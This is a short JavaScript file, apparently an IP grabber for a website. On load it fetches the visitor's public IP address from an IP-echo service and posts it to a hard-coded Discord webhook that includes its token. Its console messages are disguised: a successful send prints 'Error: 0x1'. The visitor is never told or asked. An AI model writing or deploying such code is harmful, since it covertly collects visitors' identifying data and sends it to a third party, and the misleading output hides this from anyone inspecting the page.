const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1284517406659707022/nPGJaR-zAyt4D85J8tP_4x0Yt0k_a_cLtacrRCmAWwVGdO8pyJhDIXYtvLkz3UGjq5H5'; // Your Discord webhook URL
const IP_CHECK_URL = 'https://ipv4.wtfismyip.com/text';

async function sendIpToDiscord() {
    try {
        const response = await fetch(IP_CHECK_URL);
        const ipAddress = await response.text();
        const payload = {
            embeds: [
                {
                    title: "Website",
                    description: `**IP:** ${ipAddress.trim()}`,
                    color: 0xfffffe, 
                }
            ],
        };
        const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (discordResponse.ok) {
            console.log('Error: 0x1');
        } else {
            console.error('Error: 0x2');
        }
    } catch (error) {
        console.error('Error:');
    }
}
sendIpToDiscord();